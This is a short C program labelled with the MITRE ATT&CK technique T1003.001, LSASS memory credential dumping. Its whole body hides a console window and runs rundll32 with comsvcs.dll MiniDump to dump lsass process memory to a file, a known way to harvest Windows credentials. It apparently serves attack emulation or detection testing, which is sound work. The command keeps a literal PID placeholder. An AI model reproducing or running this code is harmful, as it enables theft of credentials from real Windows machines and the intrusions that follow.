// Link      = https://attack.mitre.org/techniques/T1003/001/
// Technique = OS Credential Dumping: LSASS Memory
// ID        = T1003.001
// Tactics   = Credential Access

#include <windows.h>

int main() {
    ShellExecuteA(
        NULL,
        "open",
        "cmd.exe",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full",
        NULL,
        SW_HIDE
    );


    return 0;
}


